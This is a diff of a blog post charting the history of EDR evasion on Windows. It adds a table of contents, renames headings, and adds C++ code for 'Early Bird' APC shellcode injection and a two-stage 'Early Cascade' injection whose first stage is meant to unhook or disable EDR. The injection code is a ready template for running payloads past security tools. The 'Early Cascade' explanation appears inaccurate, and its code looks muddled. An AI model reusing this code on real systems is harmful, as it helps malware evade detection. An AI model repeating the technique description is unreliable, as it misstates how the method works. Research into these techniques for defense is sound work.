@@ -7,6 +7,23 @@ title: "The EDR Bypass Roadmap: Technical Evolution and API Subversion"
 
 This timeline breaks down the evolution of evasion—from early Windows API abuse to modern hardware- and behavior-level subversion—mapped against the **MITRE ATT&CK®** framework and aligned with my research into [**Windows APIs**](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [**ETW (Event Tracing for Windows)**](https://benjitrapp.github.io/defenses/2024-02-11-etw/).
 
+- [Phase 1: The Foundation (2010–2015)](#phase-1-the-foundation-20102015)
+  - [2012–2013: Injection Primitives \& API Abuse](#20122013-injection-primitives--api-abuse)
+  - [2014: Reflective \& Manual Loading](#2014-reflective--manual-loading)
+- [Phase 2: The Hooking Crusade (2015–2017)](#phase-2-the-hooking-crusade-20152017)
+  - [2015–2016: Understanding API Hooking](#20152016-understanding-api-hooking)
+  - [2016: Manual Unhooking Emerges](#2016-manual-unhooking-emerges)
+- [Phase 3: The Syscall Revolution (2017–2019)](#phase-3-the-syscall-revolution-20172019)
+  - [2017: Direct Syscalls](#2017-direct-syscalls)
+  - [2018–2019: Syscall Evolution](#20182019-syscall-evolution)
+- [Phase 4: The age of Deception - Syscalls \& Stack Integrity (2019–2021)](#phase-4-the-age-of-deception---syscalls--stack-integrity-20192021)
+- [Phase 5: The ETW \& Memory Evasion Era (2020–2022)](#phase-5-the-etw--memory-evasion-era-20202022)
+- [Phase 6: Advanced Injection \& Modern Era (2022–Present / Time of Writing: 2026)](#phase-6-advanced-injection--modern-era-2022present--time-of-writing-2026)
+- [Technical Summary \& API Matrix](#technical-summary--api-matrix)
+- [Conclusion](#conclusion)
+- [Conclusion](#conclusion-1)
+
+
 ## Phase 1: The Foundation (2010–2015)
 **Strategy:** Exploiting trust by utilizing legitimate Windows mechanisms for code placement.
 
@@ -133,7 +150,7 @@ While still heavily used in modern C2 frameworks, reflective loading has increas
 
 This evolution mirrors the detection trends discussed in the Windows API series above.
 
-## Phase 2: The Hooking Wars (2015–2017)
+## Phase 2: The Hooking Crusade (2015–2017)
 **Strategy:** Detecting and removing userland sensors.
 
 ### 2015–2016: Understanding API Hooking
@@ -240,7 +257,7 @@ DWORD GetSSN(LPCSTR functionName) {
     return 0;
 }
 ```
-## Phase 4: Indirect Syscalls & Stack Integrity (2019–2021)
+## Phase 4: The age of Deception - Syscalls & Stack Integrity (2019–2021)
 **Strategy:** Preserving legitimate execution context.
 
 As EDRs began analyzing call stacks, indirect syscalls ensured execution appeared to originate from trusted modules.
@@ -328,6 +345,73 @@ void PatchETW() {
 ## Phase 6: Advanced Injection & Modern Era (2022–Present / Time of Writing: 2026)
 **Strategy:** Subverting execution and detection logic.
 
+- **Early Bird Injection ([T1055](https://attack.mitre.org/techniques/T1055/))**  
+  Leveraging APC (Asynchronous Procedure Call) queues to inject code before the main thread executes, exploiting the process initialization window.
+
+```cpp
+// Example: Early Bird APC Injection
+void EarlyBirdInjection(LPCSTR szTargetPath, PVOID pShellcode, SIZE_T shellcodeSize) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Create target process in suspended state
+    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
+                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // Allocate memory in target process
+    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    // Write shellcode to allocated memory
+    WriteProcessMemory(pi.hProcess, pRemoteCode, pShellcode, shellcodeSize, NULL);
+    
+    // Queue APC to main thread (executes before thread starts)
+    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
+    
+    // Resume thread - APC executes before EntryPoint
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+```
+
+This technique is particularly effective because:
+- APC execution occurs before EDR hooks are fully initialized
+- The process is legitimate at creation time
+- No remote thread creation is required
+
+- **Early Cascade Injection ([T1055](https://attack.mitre.org/techniques/T1055/))**  
+  An evolution of Early Bird that chains multiple APC calls to establish persistence and evade behavioral detection.
+
+```cpp
+// Example: Early Cascade - Chained APC Injection
+void EarlyCascadeInjection(LPCSTR szTargetPath, PVOID pStage1, PVOID pStage2) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
+                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    
+    // Stage 1: Unhook or disable EDR
+    LPVOID pStage1Addr = VirtualAllocEx(pi.hProcess, NULL, 0x1000,
+                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, pStage1Addr, pStage1, 0x1000, NULL);
+    
+    // Stage 2: Final payload
+    LPVOID pStage2Addr = VirtualAllocEx(pi.hProcess, NULL, 0x2000,
+                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, pStage2Addr, pStage2, 0x2000, NULL);
+    
+    // Queue cascaded APCs
+    QueueUserAPC((PAPCFUNC)pStage1Addr, pi.hThread, (ULONG_PTR)pStage2Addr);
+    QueueUserAPC((PAPCFUNC)pStage2Addr, pi.hThread, NULL);
+    
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+```
+
 - **Thread Execution Hijacking ([T1055.003](https://attack.mitre.org/techniques/T1055/003/))**
   Suspending threads and modifying their context to execute malicious code.
 
@@ -389,6 +473,8 @@ AddVectoredExceptionHandler(1, MyHandler);
 | **Syscalls** | Stack Spoofing | Return address manipulation | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
 | **Tracing** | ETW Patching | `EtwEventWrite` patching | [T1562.006](https://attack.mitre.org/techniques/T1562/006/) |
 | **Tracing** | AMSI Bypass | `AmsiScanBuffer` patching | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
+| **Modern** | Early Bird Injection | `QueueUserAPC`, `CreateProcess` (suspended) | [T1055](https://attack.mitre.org/techniques/T1055/) |
+| **Modern** | Early Cascade Injection | Chained APC calls, multi-stage execution | [T1055](https://attack.mitre.org/techniques/T1055/) |
 | **Modern** | Thread Hijacking | `SetThreadContext`, `SuspendThread` | [T1055.003](https://attack.mitre.org/techniques/T1055/003/) |
 | **Modern** | VEH Execution | `AddVectoredExceptionHandler` | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
 | **Modern** | Module Stomping | Memory overwrite in loaded modules | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
